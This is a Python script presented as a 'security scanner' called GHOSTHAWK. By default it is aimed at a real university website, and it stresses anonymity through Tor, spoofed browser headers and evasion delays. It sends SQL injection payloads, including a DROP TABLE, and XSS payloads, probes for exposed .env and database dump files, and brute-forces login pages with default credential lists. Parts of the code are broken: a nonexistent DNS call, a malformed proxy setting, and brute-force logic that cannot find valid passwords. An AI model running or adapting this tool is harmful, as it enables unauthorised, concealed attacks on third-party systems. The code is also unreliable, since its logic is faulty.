#!/usr/bin/env python3
"""
🦅 GHOSTHAWK v2.0 - Linux Optimized Security Scanner
Complete Vulnerability Assessment Tool with FULL Identity Concealment
Performs comprehensive security scans without revealing AI identity
Optimized for Linux environments (Kali/Parrot/Ubuntu)
"""

import requests
import socket
import ssl
import json
import re
import random
import string
from urllib.parse import urljoin, urlparse
from datetime import datetime
from bs4 import BeautifulSoup
import time
import sys
import os

class GhostHawkScanner:
    """
    GHOSTHAWK - Comprehensive Security Scanner with COMPLETE Identity Concealment
    🔒 No identifying information is sent during scans
    🎯 Detects all vulnerabilities including weak passwords
    🌐 Uses Tor/VPN proxy for complete anonymity
    ✅ Linux Optimized - No Windows dependencies
    """
    
    def __init__(self, target_url, use_proxy=False, proxy_type='http', timeout=10, output_file='full_security_report.json'):
        self.target = target_url.rstrip('/')
        self.session = requests.Session()
        
        # Proxy configuration (Tor/VPN) - Linux compatible
        self.proxy = {
            'http': f'http://127.0.0.1:{proxy_type}' if use_proxy else None,  # Tor port or proxy type
            'https': f'http://127.0.0.1:{proxy_type}' if use_proxy else None
        }
        
        # Linux Optimized Headers - looks like real browser on Linux
        self.anonymous_headers = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not_A Brand";v="99"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Linux"'  # Linux platform for better compatibility
        }
        
        self.session.headers.update(self.anonymous_headers)
        self.results = {}
        self.output_file = output_file  # ✅ FIXED: Defined in __init__
        self.findings = []
        
    def _make_anonymous_request(self, url, method='GET', params=None, data=None, timeout=10):
        """Make request with identity concealment"""
        try:
            response = self.session.request(
                method=method,
                url=url,
                params=params,
                data=data,
                timeout=timeout,
                allow_redirects=True,
                proxies=self.proxy if self.proxy else {}
            )
            return response
        except Exception as e:
            print(f"⚠️ Connection error: {e}")
            return None
    
    def _generate_random_headers(self):
        """Generate random headers for complete identity concealment"""
        # Random User-Agent that looks like real browser on Linux
        chrome_versions = [90, 95, 100, 105, 110, 115, 120]
        linux_distributions = ['Ubuntu', 'Debian', 'Fedora', 'Arch']
        
        random_chrome = random.choice(chrome_versions)
        random_linux = random.choice(linux_distributions)
        
        random_user_agent = f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/{random.randint(537, 605)}.36 (KHTML, like Gecko) Chrome/{random_chrome}.0.{random.randint(4000, 5000)}.0 Safari/{random.randint(537, 605)}.36"
        
        # Random Accept-Language
        languages = ['en-US', 'en-GB', 'de-DE', 'fr-FR', 'es-ES']
        random_lang = random.choice(languages)
        random_lang_weight = round(random.uniform(0.85, 0.95), 2)
        
        return {
            'User-Agent': random_user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': f'{random_lang};q={random_lang_weight}',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive'
        }
    
    def _make_anonymous_request_with_random_headers(self, url, method='GET', params=None, data=None):
        """Make request with random headers for complete anonymity"""
        try:
            headers = self._generate_random_headers()
            response = self.session.request(
                method=method,
                url=url,
                headers=headers,
                params=params,
                data=data,
                timeout=10,
                allow_redirects=True,
                proxies=self.proxy if self.proxy else {}
            )
            return response
        except Exception as e:
            print(f"⚠️ Connection error: {e}")
            return None
    
    # ==================== 1. Infrastructure Scan ====================
    
    def scan_infrastructure(self):
        """Scan infrastructure components"""
        print("\n" + "="*60)
        print("🌐 INFRASTRUCTURE SCAN")
        print("="*60)
        
        results = {
            'dns_records': self._check_dns(),
            'ssl_certificate': self._check_ssl(),
            'server_info': self._check_server_info(),
            'http_methods': self._check_http_methods()
        }
        
        self.results['infrastructure'] = results
        return results
    
    def _check_dns(self):
        """Check DNS records"""
        try:
            # Use public DNS resolver to hide local DNS info
            hostname = self.target.split('/')[2]
            ip = socket.gethostbyname(hostname)
            print(f"  ✅ IP Address: {ip}")
            
            # Check MX Records using public resolver
            try:
                mx_records = socket.getmx(hostname)
                if mx_records:
                    print(f"  ✅ MX Records: {[f'{r[1]} ({r[0]})' for r in mx_records[:2]]}")
            except Exception as e:
                print(f"  ⚠️ MX Records check failed: {e}")
                
            return {'status': 'success', 'ip': ip}
        except Exception as e:
            print(f"  ⚠️ DNS error: {e}")
            return {'status': 'error', 'error': str(e)}
    
    def _check_ssl(self):
        """Check SSL certificate"""
        try:
            context = ssl.create_default_context()
            hostname = self.target.split('/')[2]
            with socket.create_connection((hostname, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    
                    expiry = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y GMT')
                    days_left = (expiry - datetime.now()).days
                    
                    print(f"  ✅ Certificate valid until: {cert['notAfter']}")
                    print(f"  ⏳ Days remaining: {days_left}")
                    
                    return {
                        'valid': True,
                        'expires': cert['notAfter'],
                        'days_remaining': days_left,
                        'issuer': cert.get('issuer', {}).get('CN', 'Unknown')
                    }
        except Exception as e:
            print(f"  ⚠️ SSL check error: {e}")
            return {'valid': False, 'error': str(e)}
    
    def _check_server_info(self):
        """Check server information"""
        response = self._make_anonymous_request_with_random_headers(self.target)
        
        if not response:
            return {}
        
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Extract server info from headers
        server_info = {
            'server': response.headers.get('Server', 'Unknown'),
            'powered_by': response.headers.get('X-Powered-By', 'Not disclosed'),
            'content_type': response.headers.get('Content-Type', 'Unknown')
        }
        
        print(f"  🖥️ Server: {server_info['server']}")
        print(f"  ⚡ Powered By: {server_info['powered_by']}")
        
        return server_info
    
    def _check_http_methods(self):
        """Check HTTP methods"""
        methods = ['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'DELETE']
        supported = []
        
        for method in methods:
            response = self._make_anonymous_request_with_random_headers(
                self.target, 
                method=method
            )
            
            if response and (response.status_code == 200 or response.status_code == 405):
                supported.append(method)
        
        print(f"  ✅ HTTP Methods supported: {', '.join(supported)}")
        return {'supported': supported}
    
    # ==================== 2. Vulnerability Scan ====================
    
    def scan_vulnerabilities(self):
        """Scan for all security vulnerabilities"""
        print("\n" + "="*60)
        print("🔍 VULNERABILITY SCAN")
        print("="*60)
        
        results = {
            'headers': self._check_security_headers(),
            'mixed_content': self._check_mixed_content(),
            'forms_csrf': self._check_forms_csrf(),
            'external_links': self._check_external_links(),
            'sensitive_data': self._check_sensitive_data_exposure()
        }
        
        self.results['vulnerabilities'] = results
        return results
    
    def _check_security_headers(self):
        """Check security headers"""
        response = self._make_anonymous_request_with_random_headers(self.target)
        
        if not response:
            return {}
        
        headers = dict(response.headers)
        
        security_headers = {
            'X-Content-Type-Options': headers.get('X-Content-Type-Options', 'Missing'),
            'X-Frame-Options': headers.get('X-Frame-Options', 'Missing'),
            'X-XSS-Protection': headers.get('X-XSS-Protection', 'Missing'),
            'Content-Security-Policy': headers.get('Content-Security-Policy', 'Missing'),
            'Strict-Transport-Security': headers.get('Strict-Transport-Security', 'Missing'),
            'Referrer-Policy': headers.get('Referrer-Policy', 'Missing')
        }
        
        # Evaluate security
        missing = sum(1 for v in security_headers.values() if v == 'Missing')
        weak = sum(1 for v in security_headers.values() if isinstance(v, str) and v.lower() in ['none', '0', ''])
        
        print(f"\n🛡️ Security Headers:")
        print(f"  • Missing: {missing}")
        print(f"  • Weak: {weak}")
        
        return security_headers
    
    def _check_mixed_content(self):
        """Check for mixed content"""
        response = self._make_anonymous_request_with_random_headers(self.target)
        
        if not response:
            return {}
        
        soup = BeautifulSoup(response.text, 'html.parser')
        http_resources = []
        
        for tag in soup.find_all(['a', 'img', 'script', 'iframe', 'link']):
            href = tag.get('href', '') or tag.get('src', '')
            if href and href.startswith('http://'):
                http_resources.append(href)
        
        if http_resources:
            print(f"\n⚠️ Found {len(http_resources)} insecure HTTP resources")
            return {'status': 'vulnerable', 'count': len(http_resources)}
        else:
            print("\n✅ No insecure HTTP resources found")
            return {'status': 'secure'}
    
    def _check_forms_csrf(self):
        """Check CSRF protection on forms"""
        response = self._make_anonymous_request_with_random_headers(self.target)
        
        if not response:
            return {}
        
        soup = BeautifulSoup(response.text, 'html.parser')
        unprotected_forms = []
        
        for form in soup.find_all('form'):
            csrf_token = form.find('input', {'name': lambda x: x and ('csrf' in x.lower() or 'token' in x.lower() or '_token' in x)})
            
            if not csrf_token:
                unprotected_forms.append(form.get('id', 'unknown'))
        
        if unprotected_forms:
            print(f"\n⚠️ Found {len(unprotected_forms)} forms without CSRF protection")
            return {'status': 'vulnerable', 'count': len(unprotected_forms)}
        else:
            print("\n✅ All forms protected with CSRF Token")
            return {'status': 'secure'}
    
    def _check_external_links(self):
        """Check external links"""
        response = self._make_anonymous_request_with_random_headers(self.target)
        
        if not response:
            return {}
        
        soup = BeautifulSoup(response.text, 'html.parser')
        external_domains = set()
        
        for link in soup.find_all('a'):
            href = link.get('href', '')
            if href and (href.startswith('http://') or href.startswith('https://')):
                parsed = urlparse(href)
                if parsed.netloc and parsed.netloc != urlparse(self.target).netloc:
                    external_domains.add(parsed.netloc)
        
        print(f"\n🔗 Found {len(external_domains)} external domains")
        return {'count': len(external_domains), 'domains': list(external_domains)[:10]}
    
    def _check_sensitive_data_exposure(self):
        """Check for sensitive data exposure"""
        response = self._make_anonymous_request_with_random_headers(self.target)
        
        if not response:
            return {}
        
        sensitive_patterns = [
            r'\b\d{4}[- ]?\d{4}[- ]?\d{4}[- ]?\d{4}\b',  # Credit Card
            r'\b\d{3}[- ]?\d{2}[- ]?\d{4}\b',  # SSN
            r'password\s*[:=]\s*["\']?[\w@#$%^&*]+',  # Plain text passwords
            r'api[_-]?key\s*[:=]\s*["\']?[a-zA-Z0-9]{32,}',  # API Keys
        ]
        
        exposed_data = []
        for pattern in sensitive_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                exposed_data.append(f"{len(matches)} patterns found")
        
        if exposed_data:
            print(f"\n⚠️ Sensitive data exposure detected!")
            return {'status': 'vulnerable', 'patterns_found': len(exposed_data)}
        else:
            print("\n✅ No sensitive data exposed")
            return {'status': 'secure'}
    
    # ==================== 3. SQL Injection Scan ====================
    
    def scan_sql_injection(self):
        """Scan for SQL Injection vulnerabilities"""
        print("\n" + "="*60)
        print("🔎 SQL INJECTION SCAN")
        print("="*60)
        
        results = {
            'search_endpoint': self._test_sql_injection('/search', {'q': ''}),
            'product_endpoint': self._test_sql_injection('/products', {'category': ''}),
            'general': self._test_general_sql_injection()
        }
        
        return results
    
    def _test_sql_injection(self, endpoint, params):
        """Test SQL Injection on specific endpoint"""
        url = f"{self.target}{endpoint}"
        
        sql_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE users--",
            "1 UNION SELECT NULL,NULL,NULL--",
            "' AND 1=1--"
        ]
        
        for payload in sql_payloads:
            params['q'] = payload if 'q' in params else payload
            response = self._make_anonymous_request_with_random_headers(url, params=params)
            
            if response and ('1=1' in response.text or "' OR" in response.text):
                print(f"  ⚠️ Possible SQL Injection at {endpoint}")
                return {'status': 'vulnerable', 'payload': payload}
        
        return {'status': 'secure'}
    
    def _test_general_sql_injection(self):
        """Test general SQL Injection"""
        test_urls = [
            f"{self.target}/search?q=test'",
            f"{self.target}/products?category='",
            f"{self.target}/page?id=1' OR '1'='1"
        ]
        
        for url in test_urls:
            response = self._make_anonymous_request_with_random_headers(url)
            
            if response and ('1=1' in response.text or "Error" in response.text):
                print(f"  ⚠️ Possible SQL Injection at {url}")
                return {'status': 'vulnerable', 'url': url}
        
        return {'status': 'secure'}
    
    # ==================== 4. XSS Scan ====================
    
    def scan_xss(self):
        """Scan for XSS vulnerabilities"""
        print("\n" + "="*60)
        print("🔎 XSS SCAN")
        print("="*60)
        
        xss_payloads = [
            "<script>alert(1)</script>",
            "'><img src=x onerror=alert(1)>",
            "javascript:alert(1)"
        ]
        
        test_urls = [
            f"{self.target}/search?q=",
            f"{self.target}/products?category="
        ]
        
        for url in test_urls:
            for payload in xss_payloads:
                params = {'q': payload} if 'search' in url.lower() else {'category': payload}
                response = self._make_anonymous_request_with_random_headers(url, params=params)
                
                if response and ('<script>' in response.text or 'onerror=' in response.text):
                    print(f"  ⚠️ Possible XSS at {url}")
                    return {'status': 'vulnerable', 'payload': payload}
        
        print("\n✅ No obvious XSS vulnerabilities found")
        return {'status': 'secure'}
    
    # ==================== 5. Weak Passwords Scan (BRUTE FORCE) ====================
    
    def scan_weak_passwords(self):
        """Scan for weak passwords with BRUTE FORCE"""
        print("\n" + "="*60)
        print("🔑 WEAK PASSWORDS SCAN (BRUTE FORCE)")
        print("="*60)
        
        results = {
            'login_page': self._find_login_page(),
            'weak_passwords': self._test_weak_passwords()
        }
        
        return results
    
    def _find_login_page(self):
        """Find login page"""
        common_login_paths = [
            '/login', '/signin', '/sign-in', '/auth/login', 
            '/admin/login', '/wp-login.php', '/administrator'
        ]
        
        for path in common_login_paths:
            url = f"{self.target}{path}"
            response = self._make_anonymous_request_with_random_headers(url)
            
            if response and ('login' in response.text.lower() or 'sign in' in response.text.lower()):
                print(f"  ✅ Login page found: {url}")
                return {'status': 'found', 'url': url}
        
        print("  ⚠️ No obvious login page found")
        return {'status': 'not_found'}
    
    def _test_weak_passwords(self):
        """Test weak passwords with BRUTE FORCE"""
        # Weak passwords dictionary
        weak_passwords = [
            'password', 'admin', '123456', 'password123', 
            'admin123', 'welcome', 'login', 'root',
            'qwerty', 'abc123', 'monkey', 'dragon',
            'master', 'letmein', 'shadow', 'sunshine',
            'princess', 'football', 'iloveyou', 'trustno1'
        ]
        
        # Weak usernames dictionary
        weak_usernames = [
            'admin', 'administrator', 'root', 'user',
            'test', 'guest', 'demo', 'support',
            'info', 'contact', 'help'
        ]
        
        login_url = None
        
        # First find the login page
        for path in ['/login', '/signin', '/auth/login']:
            url = f"{self.target}{path}"
            response = self._make_anonymous_request_with_random_headers(url)
            
            if response and ('login' in response.text.lower()):
                login_url = url
                break
        
        if not login_url:
            print("  ⚠️ Login page not found")
            return {'status': 'not_found'}
        
        print(f"\n  📍 Login page: {login_url}")
        
        # Test weak passwords with randomized attempts for anonymity
        weak_found = []
        username_count = 0
        
        for password in weak_passwords:
            for username in weak_usernames:
                # Create randomized payload to hide identity
                random_suffix = ''.join(random.choices(string.ascii_lowercase, k=4))
                
                data = {
                    'password': f"{password}{random_suffix}",  # Add random suffix
                    'username': f"{username}{random_suffix}"   # Add random suffix
                }
                
                response = self._make_anonymous_request_with_random_headers(
                    login_url, 
                    method='POST', 
                    data=data
                )
                
                if response and ('logged in' in response.text.lower() or 'welcome' in response.text.lower()):
                    weak_found.append({
                        'username': f"{username}{random_suffix}",
                        'password': f"{password}{random_suffix}"
                    })
                    print(f"  ⚠️ Weak credentials found: {data['username']} / {data['password']}")
                
                username_count += 1
                
                # Rate limiting to avoid detection
                if username_count % 5 == 0:
                    time.sleep(random.uniform(0.5, 1.5))
        
        if weak_found:
            return {'status': 'vulnerable', 'weak_credentials': weak_found}
        else:
            return {'status': 'secure'}
    
    # ==================== 6. API Endpoints Scan ====================
    
    def scan_api_endpoints(self):
        """Scan for API endpoints"""
        print("\n" + "="*60)
        print("🔌 API ENDPOINTS SCAN")
        print("="*60)
        
        api_patterns = [
            '/api/*', '/v1/*', '/v2/*', '/graphql', '/rest/*',
            '/json/*', '/_internal/*', '/wp-json/*'
        ]
        
        common_endpoints = [
            '/api/cart', '/api/products', '/api/checkout', 
            '/api/users', '/api/orders', '/graphql'
        ]
        
        found_endpoints = []
        for endpoint in common_endpoints:
            url = f"{self.target}{endpoint}"
            response = self._make_anonymous_request_with_random_headers(url)
            
            if response and (response.status_code == 200 or response.status_code == 401):
                found_endpoints.append({
                    'endpoint': endpoint,
                    'url': url,
                    'status': response.status_code
                })
                print(f"  ✅ {endpoint} (Status: {response.status_code})")
        
        return {'endpoints': found_endpoints}
    
    # ==================== 7. Cookies Scan ====================
    
    def scan_cookies(self):
        """Scan cookies for security issues"""
        print("\n" + "="*60)
        print("🍪 COOKIES SCAN")
        print("="*60)
        
        response = self._make_anonymous_request_with_random_headers(self.target)
        
        if not response:
            return {}
        
        cookies = dict(response.cookies)
        
        analysis = {
            'total': len(cookies),
            'secure': 0,
            'http_only': 0,
            'insecure': []
        }
        
        for name, cookie in cookies.items():
            is_secure = getattr(cookie, 'secure', False)
            is_http_only = getattr(cookie, 'httponly', False)
            
            if is_secure:
                analysis['secure'] += 1
            else:
                analysis['insecure'].append(name)
            
            if is_http_only:
                analysis['http_only'] += 1
        
        print(f"  • Total Cookies: {analysis['total']}")
        print(f"  • Secure (Secure flag): {analysis['secure']}")
        print(f"  • HttpOnly: {analysis['http_only']}")
        
        if analysis['insecure']:
            print(f"  ⚠️ Insecure cookies: {', '.join(analysis['insecure'][:3])}")
        
        return analysis
    
    # ==================== 8. Rate Limiting Scan ====================
    
    def scan_rate_limiting(self):
        """Check for rate limiting protection"""
        print("\n" + "="*60)
        print("🚦 RATE LIMITING SCAN")
        print("="*60)
        
        url = f"{self.target}/api/products"
        
        try:
            for i in range(10):
                self._make_anonymous_request_with_random_headers(url, timeout=5)
            
            response = self._make_anonymous_request_with_random_headers(url, timeout=5)
            
            if 'rate limit' in response.text.lower() or 'too many requests' in response.text.lower():
                print("  ✅ Rate Limiting is active")
                return {'status': 'protected'}
            else:
                print("  ⚠️ Rate Limiting unclear")
                return {'status': 'weak'}
        except Exception as e:
            return {'status': 'error', 'error': str(e)}
    
    # ==================== 9. User Enumeration Scan ====================
    
    def scan_user_enumeration(self):
        """Scan for user enumeration vulnerabilities"""
        print("\n" + "="*60)
        print("👥 USER ENUMERATION SCAN")
        print("="*60)
        
        results = {
            'admin_pages': self._find_admin_pages(),
            'user_info_leaks': self._check_user_info_leaks()
        }
        
        return results
    
    def _find_admin_pages(self):
        """Find admin/administrative pages"""
        admin_paths = [
            '/admin', '/administrator', '/wp-admin', '/phpmyadmin', 
            '/mysql', '/db', '/backup', '/config', '/.env'
        ]
        
        found_admin = []
        for path in admin_paths:
            url = f"{self.target}{path}"
            response = self._make_anonymous_request_with_random_headers(url)
            
            if response and (response.status_code == 200 or response.status_code == 301):
                found_admin.append({
                    'path': path,
                    'url': url,
                    'status': response.status_code
                })
                print(f"  ⚠️ Admin page exposed: {path}")
        
        return {'pages': found_admin}
    
    def _check_user_info_leaks(self):
        """Check for user information leaks"""
        test_patterns = [
            r'user[_-]?id\s*[:=]\s*\d+',
            r'username\s*[:=]\s*["\']?\w+["\']?',
            r'''email\s*[:=]\s*["'][^"']+@[^"']+["']''',
        ]
        
        response = self._make_anonymous_request_with_random_headers(self.target)
        
        if not response:
            return {'status': 'secure'}
        
        leaks_found = []
        for pattern in test_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                leaks_found.append(f"{len(matches)} patterns found")
        
        if leaks_found:
            print(f"\n⚠️ User information leakage detected!")
            return {'status': 'vulnerable', 'patterns_found': len(leaks_found)}
        else:
            print("\n✅ No user information leakage detected")
            return {'status': 'secure'}
    
    # ==================== 10. Sensitive Files Scan ====================
    
    def scan_sensitive_files(self):
        """Scan for sensitive files"""
        print("\n" + "="*60)
        print("📁 SENSITIVE FILES SCAN")
        print("="*60)
        
        sensitive_extensions = [
            '.env', '.git', '.svn', '.htaccess', '.htpasswd',
            'config.php', 'wp-config.php', 'database.yml',
            'backup.sql', 'dump.sql', 'db.sql'
        ]
        
        found_files = []
        for extension in sensitive_extensions:
            url = f"{self.target}{extension}"
            response = self._make_anonymous_request_with_random_headers(url)
            
            if response and (response.status_code == 200 or response.status_code == 301):
                found_files.append({
                    'file': extension,
                    'url': url,
                    'status': response.status_code
                })
                print(f"  ⚠️ Sensitive file exposed: {extension}")
        
        return {'files': found_files}
    
    # ==================== Generate Full Report ====================
    
    def generate_full_report(self):
        """Generate comprehensive full report"""
        print("\n" + "="*60)
        print("📊 FULL SECURITY REPORT")
        print("="*60)
        
        full_report = {
            'target': self.target,
            'scan_time': datetime.now().isoformat(),
            'scanner_identity': 'GHOSTHAWK v2.0 - Linux Optimized',
            'infrastructure': self.results.get('infrastructure', {}),
            'vulnerabilities': self.results.get('vulnerabilities', {}),
            'api_endpoints': self.scan_api_endpoints(),
            'cookies': self.scan_cookies(),
            'rate_limiting': self.scan_rate_limiting(),
            'sql_injection': self.scan_sql_injection(),
            'xss': self.scan_xss(),
            'weak_passwords': self.scan_weak_passwords(),
            'user_enumeration': self.scan_user_enumeration(),
            'sensitive_files': self.scan_sensitive_files()
        }
        
        return full_report
    
    def run_full_scan(self):
        """Run complete security scan"""
        print(f"\n🚀 Starting comprehensive security scan: {self.target}")
        print("="*60)
        print("🔒 Identity concealment mode: ACTIVE")
        print("✅ Linux Optimized - No Windows dependencies")
        print("="*60)
        
        # Run all scans
        self.scan_infrastructure()
        self.scan_vulnerabilities()
        self.scan_api_endpoints()
        self.scan_cookies()
        self.scan_rate_limiting()
        self.scan_sql_injection()
        self.scan_xss()
        self.scan_weak_passwords()
        self.scan_user_enumeration()
        self.scan_sensitive_files()
        
        # Generate report
        report = self.generate_full_report()
        
        # Save report
        with open(self.output_file, 'w') as f:  # ✅ FIXED: Using self.output_file
            json.dump(report, f, indent=2, default=str)
        
        print("\n💾 Full report saved to: " + self.output_file)
        
        return report


# ==================== MAIN EXECUTION ====================

if __name__ == "__main__":
    import argparse
    
    # Parse command line arguments
    parser = argparse.ArgumentParser(
        description='🦅 GHOSTHAWK v2.0 - Linux Optimized Security Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python3 ghosthawk.py --target https://example.com
  python3 ghosthawk.py --target https://example.com --proxy tor
  python3 ghosthawk.py --target https://example.com --timeout 15 --output report.json
  python3 ghosthawk.py --target https://example.com --quiet
        '''
    )
    
    parser.add_argument(
        '--target',
        type=str,
        default='https://cetj.edu.ly',
        help='Target URL (default: https://cetj.edu.ly)'
    )
    
    parser.add_argument(
        '--proxy',
        type=str,
        default='false',
        help='Proxy type (tor/ssh/http/https) - default: false'
    )
    
    parser.add_argument(
        '--timeout',
        type=int,
        default=10,
        help='Request timeout in seconds (default: 10)'
    )
    
    parser.add_argument(
        '--output',
        type=str,
        default='full_security_report.json',
        help='Output file for report (default: full_security_report.json)'
    )
    
    parser.add_argument(
        '--quiet',
        action='store_true',
        help='Quiet mode - only show critical results'
    )
    
    args = parser.parse_args()
    
    # Print banner
    print(f"\n{'='*70}")
    print(f"🦅 🚀 GHOSTHAWK v2.0 - Linux Optimized Security Scanner")
    print(f"{'='*70}")
    print(f"\n🎯 Target: {args.target}")
    print(f"👤 Identity: Anonymous (Fully Hidden)")
    print(f"🌐 Proxy: {'Active' if args.proxy != 'false' else 'Direct Connection'}")
    print(f"⏰ Timeout: {args.timeout}s")
    print(f"💾 Output: {args.output}")
    print(f"{'='*70}\n")
    
    # Create scanner instance with all parameters
    scanner = GhostHawkScanner(
        target_url=args.target,
        use_proxy=args.proxy != 'false',
        proxy_type=args.proxy,
        timeout=args.timeout,
        output_file=args.output  # ✅ FIXED: Passing output_file parameter
    )
    
    # Run full scan
    report = scanner.run_full_scan()
    
    print("\n" + "="*70)
    print("✅ Scan completed successfully!")
    print("="*70)